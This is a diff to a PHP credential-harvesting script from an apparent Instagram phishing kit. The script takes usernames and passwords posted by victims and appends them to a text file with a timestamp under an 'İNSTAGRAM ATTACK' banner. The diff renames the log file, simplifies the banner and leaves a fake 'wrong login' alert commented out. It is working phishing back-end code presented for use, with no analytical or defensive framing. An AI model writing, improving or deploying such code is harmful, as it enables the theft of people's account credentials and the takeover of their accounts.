@@ -3,33 +3,23 @@
 
 if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['saldiri'])) {
 
-$save = fopen("kaydedilen.txt","a+");
+$save = fopen("saved_info.txt","a+");
 $username = $_POST['username'];
 $password = $_POST['password'];
 $saldiri = $_POST['saldiri'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mSALDIRI       : \e[32m".$saldiri."\e[32m
-	██
-	████████████████████████████████████████
++-+-+ İNSTAGRAM ATTACK +-+-+
 
+ Tarih         : ".$tarih."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mKULLANICI ADI : \e[32m".$username."\e[32m
-	██
-	████████████████████████████████████████
+ Kullanıcı Adı : ".$username."
 
+ Şifre         : ".$password."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-        
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
